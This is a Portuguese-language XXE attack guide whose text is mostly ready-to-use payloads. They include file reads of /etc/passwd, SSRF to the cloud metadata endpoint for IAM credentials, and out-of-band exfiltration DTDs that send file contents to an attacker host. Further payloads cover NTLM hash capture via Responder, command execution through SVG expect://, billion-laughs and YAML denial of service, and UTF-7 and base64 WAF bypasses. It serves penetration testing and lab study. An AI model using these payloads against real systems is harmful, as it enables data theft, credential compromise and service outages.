Um ataque de Entidade Externa XML (XXE) √© um tipo de ataque contra um aplicativo que analisa entrada XML.

## Conceitos b√°sicos de XML

**A maior parte desta se√ß√£o foi retirada desta p√°gina incr√≠vel da Portswigger:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### O que √© XML? <a href="#what-is-xml" id="what-is-xml"></a>

XML significa "extensible markup language". XML √© uma linguagem projetada para armazenar e transportar dados. Como o HTML, o XML usa uma estrutura em forma de √°rvore de tags e dados. Ao contr√°rio do HTML, o XML n√£o usa tags predefinidas, e as tags podem receber nomes que descrevem os dados. No in√≠cio da hist√≥ria da web, o XML estava na moda como formato de transporte de dados (o "X" em "AJAX" significa "XML"). Mas sua popularidade agora diminuiu em favor do formato JSON.

### O que s√£o entidades XML? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

As entidades XML s√£o uma maneira de representar um item de dados dentro de um documento XML, em vez de usar os dados em si. V√°rias entidades s√£o incorporadas √† especifica√ß√£o da linguagem XML. Por exemplo, as entidades `&lt;` e `&gt;` representam os caracteres `<` e `>`. Esses s√£o metacaracteres usados para denotar tags XML e, portanto, geralmente devem ser representados usando suas entidades quando aparecem dentro de dados.

### O que s√£o elementos XML?

As declara√ß√µes de tipo de elemento definem as regras para o tipo e n√∫mero de elementos que podem aparecer em um documento XML, quais elementos podem aparecer dentro de outros e em que ordem devem aparecer. Por exemplo:

* `<!ELEMENT stockCheck ANY>` Significa que qualquer objeto pode estar dentro do pai `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck EMPTY> Significa que deve estar vazio `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> Declara que `<stockCheck>` pode ter os filhos `<productId>` e `<storeId>`

### O que √© a defini√ß√£o de tipo de documento? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

A defini√ß√£o de tipo de documento XML (DTD) cont√©m declara√ß√µes que podem definir a estrutura de um documento XML, os tipos de valores de dados que ele pode conter e outros itens. A DTD √© declarada dentro do elemento `DOCTYPE` opcional no in√≠cio do documento XML. A DTD pode ser totalmente autocontida dentro do pr√≥prio documento (conhecida como "DTD interna") ou pode ser carregada de outro lugar (conhecida como "DTD externa") ou pode ser h√≠brida das duas.

### O que s√£o entidades personalizadas XML? <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

O XML permite que entidades personalizadas sejam definidas dentro da DTD. Por exemplo:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

Essa defini√ß√£o significa que qualquer uso da refer√™ncia de entidade `&myentity;` dentro do documento XML ser√° substitu√≠do pelo valor definido: "`my entity value`".

### O que s√£o entidades externas XML? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

As entidades externas XML s√£o um tipo de entidade personalizada cuja defini√ß√£o est√° localizada fora da DTD onde s√£o declaradas.

A declara√ß√£o de uma entidade externa usa a palavra-chave `SYSTEM` e deve especificar uma URL da qual o valor da entidade deve ser carregado. Por exemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

A URL pode usar o protocolo `file://`, e as entidades externas podem ser carregadas a partir de um arquivo. Por exemplo:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

As entidades externas XML fornecem o principal meio pelo qual surgem os ataques de [entidade externa XML (XXE)](https://portswigger.net/web-security/xxe).

### O que s√£o entidades de par√¢metro XML?

√Äs vezes, ataques XXE usando entidades regulares s√£o bloqueados, devido a alguma valida√ß√£o de entrada pela aplica√ß√£o ou alguma prote√ß√£o do analisador XML que est√° sendo usado. Nessa situa√ß√£o, voc√™ pode ser capaz de usar entidades de par√¢metro XML em vez disso. As entidades de par√¢metro XML s√£o um tipo especial de entidade XML que s√≥ pode ser referenciada em outro lugar dentro da DTD. Para fins presentes, voc√™ s√≥ precisa saber duas coisas. Primeiro, a declara√ß√£o de uma entidade de par√¢metro XML inclui o caractere de porcentagem antes do nome da entidade:

`<!ENTITY % myparameterentity "my parameter entity value" >`

E segundo, as entidades de par√¢metro s√£o referenciadas usando o caractere de porcentagem em vez do e comercial usual: `%myparameterentity;`

Isso significa que voc√™ pode testar o XXE cego usando detec√ß√£o fora de banda via entidades de par√¢metro XML da seguinte maneira:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

Esta carga √∫til XXE declara uma entidade de par√¢metro XML chamada `xxe` e, em seguida, usa a entidade dentro da DTD. Isso causar√° uma pesquisa DNS e uma solicita√ß√£o HTTP ao dom√≠nio do atacante, verificando que o ataque foi bem-sucedido.

## Principais ataques

[A maioria desses ataques foi testada usando os incr√≠veis laborat√≥rios XEE da Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### Novo teste de entidade

Neste ataque, vou testar se uma simples nova declara√ß√£o de ENTIDADE est√° funcionando.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```
### Ler arquivo

Vamos tentar ler o arquivo `/etc/passwd` de diferentes maneiras. Para o Windows, voc√™ pode tentar ler: `C:\windows\system32\drivers\etc\hosts`

Neste primeiro caso, observe que SYSTEM "_\*\*file:///\*\*etc/passwd_" tamb√©m funcionar√°.
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Este segundo caso pode ser √∫til para extrair um arquivo se o servidor web estiver usando PHP (n√£o √© o caso dos laborat√≥rios Portswiggers).
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Neste terceiro caso, observe que estamos declarando o `Element stockCheck` como ANY.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Listagem de diret√≥rios

Em aplica√ß√µes baseadas em **Java**, pode ser poss√≠vel **listar o conte√∫do de um diret√≥rio** via XXE com um payload como este (apenas solicitando o diret√≥rio em vez do arquivo):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Um XXE pode ser usado para abusar de um SSRF dentro de uma nuvem.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Usando a **t√©cnica comentada anteriormente** voc√™ pode fazer o servidor acessar um servidor que voc√™ controla para mostrar que ele √© vulner√°vel. Mas, se isso n√£o estiver funcionando, talvez seja porque **as entidades XML n√£o s√£o permitidas**, nesse caso voc√™ pode tentar usar **entidades de par√¢metros XML**:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### SSRF "Cego" - Exfiltrar dados fora de banda

**Nesta ocasi√£o, vamos fazer com que o servidor carregue um novo DTD com uma carga maliciosa que enviar√° o conte√∫do de um arquivo via solicita√ß√£o HTTP (para arquivos de v√°rias linhas, voc√™ pode tentar exfiltr√°-lo via** _**ftp://**_**). Esta explica√ß√£o foi retirada do** [**laborat√≥rio Portswiggers aqui**](https://portswigger.net/web-security/xxe/blind)**.**

Um exemplo de um DTD malicioso para exfiltrar o conte√∫do do arquivo `/etc/hostname` √© o seguinte:
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Esta DTD realiza os seguintes passos:

* Define uma entidade de par√¢metro XML chamada `file`, contendo o conte√∫do do arquivo `/etc/passwd`.
* Define uma entidade de par√¢metro XML chamada `eval`, contendo uma declara√ß√£o din√¢mica de outra entidade de par√¢metro XML chamada `exfiltrate`. A entidade `exfiltrate` ser√° avaliada fazendo uma solicita√ß√£o HTTP ao servidor web do atacante contendo o valor da entidade `file` dentro da string de consulta da URL.
* Usa a entidade `eval`, o que faz com que a declara√ß√£o din√¢mica da entidade `exfiltrate` seja executada.
* Usa a entidade `exfiltrate`, para que seu valor seja avaliado solicitando a URL especificada.

O atacante deve ent√£o hospedar a DTD maliciosa em um sistema que ele controle, normalmente carregando-a em seu pr√≥prio servidor web. Por exemplo, o atacante pode servir a DTD maliciosa na seguinte URL:\
`http://web-attacker.com/malicious.dtd`

Finalmente, o atacante deve enviar a seguinte carga XXE para a aplica√ß√£o vulner√°vel:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Este payload XXE declara uma entidade de par√¢metro XML chamada `xxe` e, em seguida, usa a entidade dentro do DTD. Isso far√° com que o analisador XML busque o DTD externo no servidor do atacante e o interprete inline. As etapas definidas dentro do DTD malicioso s√£o ent√£o executadas e o arquivo `/etc/passwd` √© transmitido para o servidor do atacante.

### Baseado em Erro (DTD Externo)

**Neste caso, vamos fazer com que o servidor carregue um DTD malicioso que mostrar√° o conte√∫do de um arquivo dentro de uma mensagem de erro (isso s√≥ √© v√°lido se voc√™ puder ver mensagens de erro).** [**Exemplo daqui.**](https://portswigger.net/web-security/xxe/blind)

Voc√™ pode acionar uma mensagem de erro de an√°lise XML contendo o conte√∫do do arquivo `/etc/passwd` usando um DTD externo malicioso da seguinte maneira:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Esta DTD realiza os seguintes passos:

* Define uma entidade de par√¢metro XML chamada `file`, contendo o conte√∫do do arquivo `/etc/passwd`.
* Define uma entidade de par√¢metro XML chamada `eval`, contendo uma declara√ß√£o din√¢mica de outra entidade de par√¢metro XML chamada `error`. A entidade `error` ser√° avaliada carregando um arquivo inexistente cujo nome cont√©m o valor da entidade `file`.
* Usa a entidade `eval`, o que faz com que a declara√ß√£o din√¢mica da entidade `error` seja executada.
* Usa a entidade `error`, de modo que seu valor seja avaliado tentando carregar o arquivo inexistente, resultando em uma mensagem de erro contendo o nome do arquivo inexistente, que √© o conte√∫do do arquivo `/etc/passwd`.

Chame o erro DTD externo com:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
E voc√™ deve ver o conte√∫do do arquivo dentro da mensagem de erro da resposta do servidor web.

![](<../.gitbook/assets/image (223) (1).png>)

_**Observe que o DTD externo nos permite incluir uma entidade dentro da segunda (****`eval`****), mas √© proibido no DTD interno. Portanto, voc√™ n√£o pode for√ßar um erro sem usar um DTD externo (geralmente).**_

### **Baseado em erro (DTD do sistema)**

E quanto √†s vulnerabilidades cegas XXE quando as intera√ß√µes **fora de banda s√£o bloqueadas** (conex√µes externas n√£o est√£o dispon√≠veis)? [Informa√ß√µes daqui](https://portswigger.net/web-security/xxe/blind).

Nessa situa√ß√£o, ainda pode ser poss√≠vel **disparar mensagens de erro contendo dados sens√≠veis**, devido a uma brecha na especifica√ß√£o da linguagem XML. Se o DTD de um documento usa uma **combina√ß√£o de declara√ß√µes DTD internas e externas**, ent√£o o **DTD interno pode redefinir entidades que s√£o declaradas no DTD externo**. Quando isso acontece, a restri√ß√£o de usar uma entidade de par√¢metro XML dentro da defini√ß√£o de outra entidade de par√¢metro √© relaxada.

Isso significa que um atacante pode empregar a t√©cnica XXE baseada em erro de dentro de um DTD interno, desde que a entidade de par√¢metro XML que eles usam esteja **redefinindo uma entidade que √© declarada dentro de um DTD externo**. Claro, se as conex√µes fora de banda estiverem bloqueadas, o DTD externo n√£o pode ser carregado de um local remoto. Em vez disso, ele precisa ser um **arquivo DTD externo que esteja local no servidor de aplicativos**. _Essencialmente, o ataque envolve invocar um arquivo DTD que acontece de existir no sistema de arquivos local e reutiliz√°-lo para redefinir uma entidade existente de uma maneira que dispara um erro de an√°lise contendo dados sens√≠veis._

Por exemplo, suponha que haja um arquivo DTD no sistema de arquivos do servidor no local `/usr/local/app/schema.dtd`, e este arquivo DTD define uma entidade chamada `custom_entity`. Um atacante pode disparar uma mensagem de erro de an√°lise XML contendo o conte√∫do do arquivo `/etc/passwd` enviando um DTD h√≠brido como o seguinte:
```markup
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```
Esta DTD realiza os seguintes passos:

* Define uma entidade de par√¢metro XML chamada `local_dtd`, contendo o conte√∫do do arquivo DTD externo que existe no sistema de arquivos do servidor.
* Redefine a entidade de par√¢metro XML chamada `custom_entity`, que j√° est√° definida no arquivo DTD externo. A entidade √© redefinida como contendo o [exploit XXE baseado em erro](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) que j√° foi descrito, para disparar uma mensagem de erro contendo o conte√∫do do arquivo `/etc/passwd`.
* Usa a entidade `local_dtd`, para que o DTD externo seja interpretado, incluindo o valor redefinido da entidade `custom_entity`. Isso resulta na mensagem de erro desejada.

    **Exemplo do mundo real:** Sistemas que usam o ambiente de desktop GNOME frequentemente t√™m um DTD em `/usr/share/yelp/dtd/docbookx.dtd` contendo uma entidade chamada `ISOamso`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Como essa t√©cnica usa um **DTD interno, voc√™ precisa encontrar um v√°lido primeiro**. Voc√™ pode fazer isso **instalando** o mesmo **SO / Software** que o servidor est√° usando e **procurando alguns DTDs padr√£o**, ou **obtendo uma lista** de **DTDs padr√£o** dentro dos sistemas e **verificando** se algum deles existe:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### Encontrando DTDs dentro do sistema

No seguinte reposit√≥rio incr√≠vel do Github, voc√™ pode encontrar **caminhos de DTDs que podem estar presentes no sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Al√©m disso, se voc√™ tiver a **imagem Docker do sistema da v√≠tima**, voc√™ pode usar a ferramenta do mesmo reposit√≥rio para **escanear** a **imagem** e **encontrar** o caminho dos **DTDs** presentes dentro do sistema. Leia o [Readme do Github](https://github.com/GoSecure/dtd-finder) para aprender como fazer isso.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

 [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

 [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Analisadores de Office Open XML

(Mencionado [**aqui**](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/))\
Muitas aplica√ß√µes web permitem que voc√™ fa√ßa upload de documentos do Microsoft Office e, em seguida, analisam alguns detalhes deles. Por exemplo, voc√™ pode ter uma aplica√ß√£o web que permite importar dados fazendo upload de uma planilha no formato XLSX. Em algum momento, para que o analisador extraia os dados da planilha, o analisador precisar√° **analisar pelo menos um arquivo XML**.

A √∫nica maneira de testar isso √© gerar um **arquivo do Microsoft Office que contenha uma carga √∫til XXE**, ent√£o vamos fazer isso. Primeiro, crie um diret√≥rio vazio para descompactar o documento e descompacte-o!
```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
  inflating: ./unzipped/word/numbering.xml
  inflating: ./unzipped/word/settings.xml
  inflating: ./unzipped/word/fontTable.xml
  inflating: ./unzipped/word/styles.xml
  inflating: ./unzipped/word/document.xml
  inflating: ./unzipped/word/_rels/document.xml.rels
  inflating: ./unzipped/_rels/.rels
  inflating: ./unzipped/word/theme/theme1.xml
  inflating: ./unzipped/[Content_Types].xml
```
Abra o arquivo `./unzipped/word/document.xml` no seu editor de texto favorito (vim) e edite o **XML para incluir sua carga √∫til XXE favorita**. A primeira coisa que eu tento geralmente √© uma solicita√ß√£o HTTP, como esta:
```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```
Essas linhas devem ser inseridas entre os dois objetos XML raiz, como este exemplo, e √© claro que voc√™ precisar√° substituir a URL por uma URL que possa monitorar as solicita√ß√µes:

![Essas linhas devem ser inseridas entre os dois objetos XML raiz, como este exemplo](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

Tudo o que resta √© **compactar o arquivo para criar seu arquivo malicioso poc.docx**. A partir do diret√≥rio "descompactado" que criamos anteriormente, execute o seguinte:

![A partir do diret√≥rio "descompactado" que criamos anteriormente, execute o seguinte:](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

Agora, fa√ßa upload do arquivo para sua aplica√ß√£o web (esperan√ßosamente) vulner√°vel e reze para os deuses do hacking por uma solicita√ß√£o em seus logs do Burp Collaborator.

### Protocolo Jar

O protocolo `jar` est√° dispon√≠vel apenas em **aplica√ß√µes Java**. Ele permite acessar arquivos dentro de um arquivo **PKZIP** (`.zip`, `.jar`, ...) e funciona para arquivos locais e remotos:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Ser capaz de acessar arquivos dentro de arquivos PKZIP √© **super √∫til para abusar do XXE via arquivos DTD do sistema.** Verifique [esta se√ß√£o para aprender como abusar de arquivos DTD do sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Por tr√°s das cenas

1. Ele faz uma solicita√ß√£o HTTP para carregar o arquivo zip. `https://download.host.com/myarchive.zip`
2. Ele salva a resposta HTTP em uma localiza√ß√£o tempor√°ria. `/tmp/...`
3. Ele extrai o arquivo.
4. Ele l√™ o `file.zip`
5. Ele exclui arquivos tempor√°rios.

Observe que √© poss√≠vel interromper o fluxo na segunda etapa. O truque √© nunca fechar a conex√£o ao servir o arquivo. [Esta ferramenta pode ser √∫til](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): uma em python `slow_http_server.py` e outra em java `slowserver.jar`.

Depois que o servidor baixou seu arquivo, voc√™ precisa encontrar sua localiza√ß√£o navegando no diret√≥rio tempor√°rio. Sendo aleat√≥rio, o caminho do arquivo n√£o pode ser previsto com anteced√™ncia.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
Escrever arquivos em um diret√≥rio tempor√°rio pode ajudar a **escalar outra vulnerabilidade que envolve uma travessia de caminho** (como inclus√£o de arquivo local, inje√ß√£o de modelo, RCE XSLT, desserializa√ß√£o, etc).
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque de Bilh√µes de Risadas
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Explos√£o Quadr√°tica

![](<../.gitbook/assets/image (531).png>)

#### Obtendo NTML

Em hosts Windows, √© poss√≠vel obter o hash NTML do usu√°rio do servidor web definindo um manipulador responder.py:
```
Responder.py -I eth0 -v
```
e enviando a seguinte solicita√ß√£o
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Superf√≠cies XXE Ocultas

### XInclude

[A partir daqui.](https://portswigger.net/web-security/xxe)

Algumas aplica√ß√µes **recebem dados enviados pelo cliente, incorporam-nos no lado do servidor em um documento XML e, em seguida, analisam o documento**. Um exemplo disso ocorre quando os dados enviados pelo cliente s√£o colocados em uma **solicita√ß√£o SOAP de backend**, que √© ent√£o processada pelo servi√ßo SOAP de backend.

Nessa situa√ß√£o, voc√™ n√£o pode realizar um ataque XXE cl√°ssico, porque **n√£o controla todo o XML** e, portanto, n√£o pode definir ou modificar um elemento `DOCTYPE`. No entanto, voc√™ pode ser capaz de usar `XInclude` em vez disso. `XInclude` √© uma parte da especifica√ß√£o XML que permite que um documento XML seja constru√≠do a partir de subdocumentos. Voc√™ pode colocar um ataque `XInclude` em qualquer valor de dados em um documento XML, portanto, o ataque pode ser realizado em situa√ß√µes em que voc√™ controla apenas um √∫nico item de dados que √© colocado em um documento XML do lado do servidor.

Para realizar um ataque `XInclude`, voc√™ precisa fazer refer√™ncia ao namespace `XInclude` e fornecer o caminho para o arquivo que deseja incluir. Por exemplo:
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - Upload de Arquivo

[Daqui.](https://portswigger.net/web-security/xxe)

Algumas aplica√ß√µes permitem que os usu√°rios fa√ßam upload de arquivos que s√£o processados ‚Äã‚Äãno lado do servidor. Alguns formatos de arquivo comuns usam XML ou cont√™m subcomponentes XML. Exemplos de formatos baseados em XML s√£o formatos de documentos de escrit√≥rio como DOCX e formatos de imagem como SVG.

Por exemplo, uma aplica√ß√£o pode permitir que os usu√°rios **fa√ßam upload de imagens** e processem ou validem essas imagens no servidor ap√≥s o upload. Mesmo que a aplica√ß√£o espere receber um formato como PNG ou JPEG, a **biblioteca de processamento de imagem que est√° sendo usada pode suportar imagens SVG**. Como o formato SVG usa XML, um atacante pode enviar uma imagem SVG maliciosa e, assim, alcan√ßar uma superf√≠cie de ataque oculta para vulnerabilidades XXE.
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Voc√™ tamb√©m pode tentar **executar comandos** usando o wrapper "expect" do PHP:
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
**Observa√ß√£o: A primeira linha do arquivo lido ou do resultado da execu√ß√£o aparecer√° DENTRO da imagem criada. Portanto, voc√™ precisa ser capaz de acessar a imagem que o SVG criou.**

### **PDF - Upload de arquivo**

Leia o seguinte post para **aprender como explorar um XXE fazendo upload de um arquivo PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded para XML

Se uma solicita√ß√£o POST aceita os dados no formato XML, voc√™ pode tentar explorar um XXE nessa solicita√ß√£o. Por exemplo, se uma solicita√ß√£o normal cont√©m o seguinte:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Ent√£o voc√™ pode ser capaz de enviar a seguinte solicita√ß√£o, com o mesmo resultado:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON para XEE

Para alterar a requisi√ß√£o, voc√™ pode usar uma extens√£o do Burp chamada "**Content Type Converter**". [Aqui](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) voc√™ pode encontrar um exemplo disso:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```
Outro exemplo pode ser encontrado [aqui](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF e Bypasses de Prote√ß√µes

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Isso s√≥ funciona se o servidor XML aceitar o protocolo `data://`.

### UTF-7

Voc√™ pode usar a \[**"Receita de Codifica√ß√£o**" do CyberChef aqui ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) para transformar em UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass do Protocolo File:/

